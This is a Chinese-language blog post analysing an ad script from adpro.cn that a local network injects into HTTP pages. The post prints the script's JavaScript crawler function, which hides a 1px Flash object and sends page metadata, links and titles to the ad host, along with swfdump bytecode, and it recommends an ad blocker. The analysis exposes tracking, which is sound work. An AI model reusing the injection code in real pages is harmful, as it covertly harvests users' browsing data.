---
layout: post
title: Adpro.cn is Watching You
description:
categories: [blog, cn]
math: true
---

## 怎么发现的

访问一些网站的时候，有时出现 javascript 脚本错误，发现页面的最后有一行：

{% highlight javascript %}
<script>_guanggao_pub = "<长度20位的十六进制编码>";_guanggao_slot = "<长度20位的十六进制编码>";
</script><script src="http://x.adpro.cn/gngo.js"></script>
{% endhighlight %}

adpro 名字就说明了是广告相关的东西，最开始我以为那个网站的广告，后来发现几乎所有的网站都有。想必是被强行插入了。于是点击 adpro.cn 发现首页赫然写到 1.2 亿的覆盖面。你知道 1.2 亿的覆盖面怎么来的吗？


*偷来的。*


## 隐私偷取函数

整个[文件][5]的关键在这个函数：

{% highlight javascript 86 %}
function na(d) {
  var c = "http://" + G + "/crawl/er.swf?initrc=_proCrawlerInit&" + Math.random(),
      a = {};
  a[t] = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" \
         codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" ' 
         + x + "=1 " + y + '=1 id=_proCrawlerCom name=_proCrawlerCom><param name=movie value="' 
         + c + '"><param name=allowScriptAccess value=always><param name=quality value=low>\
	 <embed src="' + c + '" allowscriptaccess=always quality=low ' + x + "=1 " + y 
         + '=1 name=_proCrawlerCom id=_proCrawlerCom type="application/x-shockwave-flash">\
         </embed></object>';
  a[L] = A + ";" + u + ":1px;" + z + ":1px;" + x + ":1px;" + y + ":1px;overflow:hidden;";
  c = w("div", a);
  p[s](c, v);
  if ("html" !== d.type) {
      d = "";
      var c = k[D][oa]("meta"),
          e;
      for (e in c) c[e].name && -1 < "description,keywords".indexOf(c[e].name[H]()) 
        && (d += c[e].getAttribute("content")[I]());
      c = [];
      for (e in k.links) k.links[e].href && c[J]([k.links[e].href, k.links[e].innerText]);
      var b = {};
      b[pa] = $;
      b[r] = R;
      b[qa] = c;
      b[aa] = ha;
      b[ba] = k[ba] ? k[ba][H]().replace(/\s{2,}/g, " ").replace(/^\s+/, "").replace(/\s+$/, "")
      	      	    : "";
      b.text = (d + " " + p[T])[H]().replace(/<\s*\/?\w+[^>]*>/g,
          " ").replace(/[^0-9a-zA-Z\-\.\u4e00-\u9fa5]+/g, " ")
  }
  window._proCrawlerInit = function () {
      var a = window._proCrawlerCom;
      a && (a[K] && (a.splice || a.item) && (a = a[0].i8crawlPage ? a[0] : a[1]), a.i8crawlPage 
          && a.i8crawlPage(O + "//" + G + "/crawl/er", b, 
            window._proCrawlerDone ? "_proCrawlerDone" : ""))
  }
}
{% endhighlight %}

从名字就是在干什么了： crawl.

object 的设置很猥琐， width 和 height 都设置为 1。allowScriptAccess 设置成了 always，意思是允许这个 flash 文件中的代码调用页面的 javascript 函数，你应该看看 Adobe 对此的[警告][1]。

window._proCrawlerInit 是一个初始化函数，看里面的内容是通过一个叫 i8crawlPage 的函数访问 adpro.cn，并将数据 POST（猜测） 上去，而这个函数在整个 js 里面都没有被调用的行为，猜测应该是 swf 注册进去的。而 i8crawlPage 的实现放到了 swf 里面，好处就在于私密性：通过查看 html 文件不知道 swf 干了什么坏事。（关于 swf 与 javascript 互相调用的方法：[Quick Tip: How to Communicate Between Flash and JavaScript][2]）

## 窥视了你的什么数据

上面函数中的 b 就是它窥视的数据，包括页面 meta 里面的内容以及页面的所有链接信息。它有了这些数据就能判断给你推送什么广告了。

## swfdump

swf 是字节码文件，运行在 adobe 的 flash 插件中，但这种东西中能 dump 出点什么，开源利器 [swftool][3]：

~~~
swfdump -D er.swf > er.swf.txt
~~~

不难从 dump 出来的文件里面看到有用的信息，通过查找 i8crawlPage 很容易发现 er.swf 向页面注册了这个函数：

~~~
     method <q>[public]::void <q>[private]NULL::initialize=()(0 params, 0 optional)
    [stack:3 locals:1 scope:9-10 flags:] slot:0                                 
    {                                                                           
        00000) + 0:0 getlocal_0                                                 
        00001) + 1:0 pushscope                                                  
        00002) + 0:1 getlex <q>[public]flash.system::Security                   
        00003) + 1:1 pushstring "*"                                             
        00004) + 2:1 callpropvoid <q>[public]::allowDomain, 1 params            
        00005) + 0:1 getlex <q>[public]flash.external::ExternalInterface        
        00006) + 1:1 pushstring "i8crawlPage"                                   
        00007) + 2:1 getlocal_0                                                 
        00008) + 3:1 getproperty <q>[public]::i8crawlPage                       
        00009) + 3:1 callpropvoid <q>[public]::addCallback, 2 params            
        00010) + 0:1 returnvoid                                                 
    }                                                                           
~~~

而页面的初始化函数 _proCrawlerInit 在上面的 object src 里面通过叫做 initr 的参数传递给了 swf:

~~~
     method <q>[public]::void <q>[private]NULL::postInit=()(0 params, 0 optional)
    [stack:3 locals:2 scope:9-12 flags:] slot:0                                 
    {                                                                           
        00000) + 0:0 getlocal_0                                                 
        00001) + 1:0 pushscope                                                  
        00002) + 0:1 pushstring "initrc"                                        
        00003) + 1:1 getlex <q>[public]::loaderInfo                             
        00004) + 2:1 getproperty <q>[public]::parameters                        
        00005) + 2:1 in                                                         
        00006) + 1:1 iffalse ->25                                               
           TRY {                                                                
        00007) + 0:1 getlex <q>[public]flash.external::ExternalInterface        
        00008) + 1:1 getlex <q>[public]::loaderInfo                             
        00009) + 2:1 getproperty <q>[public]::parameters                        
        00010) + 2:1 pushstring "initrc"                                        
        00011) + 3:1 getproperty <l,multi>{[private]NULL,[public]"",
          [namespace]http://adobe.com/AS3/2006/builtin,
          [protected]HTTPCrawler,[packageinternal]"",[private]NULL,
          [staticprotected]HTTPCrawler,[staticprotected]flash.display:Sprite,
          [staticprotected]flash.display:DisplayObjectContainer,
          [staticprotected]flash.display:InteractiveObject,
          [staticprotected]flash.display:DisplayObject,
          [staticprotected]flash.events:EventDispatcher}
        00012) + 2:1 callpropvoid <q>[public]::call, 1 params                   
        00013) + 0:1 jump ->25                                                  
           } // END TRY (HANDLER: 14)                                           
   ...                                            
~~~

这两段 dump 出来的代码，充分验证了我的想法。



## 为什么会有这样一行代码？

{% highlight javascript 232 %}
ka = ("To work with us, first talk to us: 6d6f632e646976616440746361746e6f63", 2147483647) | 0,
{% endhighlight %}

第一反应就是这些那些互联网公司发布招聘信息的 geek 方法，在源码中添加联系方式。这个看来更有点挑战。即使不知道 2147483647 是什么东西，google 一下就知道它是 js 里面最大的整数： $2^{32}−1$，不是关键，而前面那一串才是重点。我开始以为是什么加密的东西，看了几遍发现有很多相似的 2 位字符，比如 6f, 63，立马想到了 ascii:

~~~
6d6f632e646976616440746361746e6f63
 m o c . d i v a d @ t c a t n o c
~~~

反过来就是：contact@david.com，于是我点开 david.com 看到下面的 flash：

<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="640" height="384">
      <param name="movie" value="http://david.com/david.swf" />
      <param name="quality" value="high" /><param name="BGCOLOR" value="#000000" />
      <embed src="http://david.com/david.swf" width="640" height="384" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" bgcolor="#000000" />
</object>

这个 swf 是无害的，因为它没有和 html 页面及其 Javascript 有任何不可告人的后台交互。但问题是，这段代码怎么会在一家无耻的广告公司的代码中出现，而且还是另一个毫不相干的网址。我觉得是他们在使用工具 uglify 原生 js 的时候，那个工具自己插入进去的，或者更可能整个 js 文件都不是 adpro.cn 自己编写的，说明这家公司的资源完全不在技术方面，而在强行插入方面。如果真是这样，adpro.cn 更显得傻逼。

## 强行插入

这叫强奸，不是吗。

我是通过小区的私人网络接入的电信，之前是直接用的电信，没有这种事。那个“私人”的网络设备肯定有问题，可能通过某种利益链，允许 adpro.cn 在明文网络数据传入终端用户之前插上一段，根据插入的部位来看，在页面的后面，菊部无疑。

这种能在任何（http）页面被插入脚本的行为，无异于在网络上的你，后面总有人跟着，随时记录你的一言一行，一举一动，并向上面的 big brother 汇报。他们所赚到的每一分钱都有来自你的裸奔导致无良商家给他们的围观费。而你就马路中央不着一丝的小丑，却自以为衣着光鲜。

## 禁止该脚本的方法

如果脚本是被强行插入的，你只能禁止它，而不能完全消灭它。我使用的是 Firefox 浏览器，安装 [ADB Plus][4] 插件即可。Google Chrome 下面也有类似的插件。


## 技术

单单技术而言，Adobe 的 flash 目前比基于 html 的各种动画视频技术，比如 canvas 或者 WebGL 等，体验上要更好，而且对于技术敏感的交互，你使用 swf 的 bytecode，毕竟别人没法直接抄袭。对手不会在一晚上就知道你在干吗。

swf 是除了 html/css/javascript 之外的另一种可能的选择，对一些问题，swf 处理起来更能更好。不要将它完全排除在考虑之外。


## 最后

本来想说互联网上唯一的安全来自加密，结果这几天就爆出 OpenSSL 的[严重安全漏洞][6]，完全是代码的实现导致，未检查长度的 memcpy 导致内存中多达 64K 的数据被泄漏，这部分数据可能含有包括私钥、密码等极端重要的用安全信息。

这比广告公司偷取用户数据严重的多，人类目前在网上赖以生存的安全保障全系于此 https 链接，虽然数学上强大的数论保证破解的实际不可行，但绝大多数的漏洞却来自人无法抵制的愚蠢和欲望。


[1]: http://helpx.adobe.com/flash-player/kb/changes-allowscriptaccess-default-flash-player.html
[2]: http://code.tutsplus.com/tutorials/quick-tip-how-to-communicate-between-flash-and-javascript--active-3370
[3]: http://www.swftools.org/download.html
[4]: https://adblockplus.org/
[5]: http://x.adpro.cn/gngo.js
[6]: http://heartbleed.com/


